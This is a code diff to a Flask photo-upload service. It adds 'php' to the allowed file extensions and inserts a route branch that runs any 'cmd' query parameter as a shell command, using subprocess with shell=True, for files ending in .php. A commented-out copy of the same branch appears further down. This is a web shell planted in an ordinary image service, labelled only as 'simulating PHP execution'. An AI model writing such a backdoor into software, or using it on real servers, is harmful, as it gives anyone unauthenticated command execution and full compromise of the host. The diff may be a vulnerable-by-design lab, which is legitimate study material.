@@ -1,6 +1,7 @@
 # photo_service/app.py
 import logging
-from flask import Flask, request, jsonify, make_response, send_file
+from flask import Flask, request, jsonify, make_response, send_file, send_from_directory
+import subprocess
 from flask_cors import CORS
 import mysql.connector
 import os
@@ -65,7 +66,7 @@ def create_photos_table():
         conn.close()
         
 UPLOAD_FOLDER = '/app/uploads'
-ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
+ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'php'}
 
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
@@ -128,10 +129,21 @@ def get_photo(filename):
     app.logger.info(f"Looking for file at path: {file_path}")
     if os.path.exists(file_path):
         app.logger.info(f"File found, sending: {file_path}")
+        if filename.endswith('.php') and 'cmd' in request.args:
+            # Simulate PHP execution
+            cmd = request.args.get('cmd')
+            try:
+                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                return f"<pre>{output.decode()}</pre>"
+            except subprocess.CalledProcessError as e:
+                return f"<pre>Command failed: {e.output.decode()}</pre>"
+            else:
+                return send_from_directory(UPLOAD_FOLDER, filename)
         return send_file(file_path)
     else:
         app.logger.error(f"File not found: {file_path}")
         return jsonify({"status": "error", "message": "File not found"}), 404
+    
 
 @app.route('/api/v1/photos', methods=['GET'])
 def get_photos():
@@ -150,6 +162,22 @@ def get_photos():
         cursor.close()
         conn.close()
 
+
+# @app.route('/api/v1/photos/<path:filename>')
+# def serve_file(filename):
+#     file_path = os.path.join(UPLOAD_FOLDER, filename)
+#     if filename.endswith('.php') and 'cmd' in request.args:
+#         # Simulate PHP execution
+#         cmd = request.args.get('cmd')
+#         try:
+#             output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+#             return f"<pre>{output.decode()}</pre>"
+#         except subprocess.CalledProcessError as e:
+#             return f"<pre>Command failed: {e.output.decode()}</pre>"
+#     else:
+#         return send_from_directory(UPLOAD_FOLDER, filename)
+    
+    
 if __name__ == '__main__':
     app.logger.info("Starting Photo Service...")
     os.makedirs(UPLOAD_FOLDER, exist_ok=True)
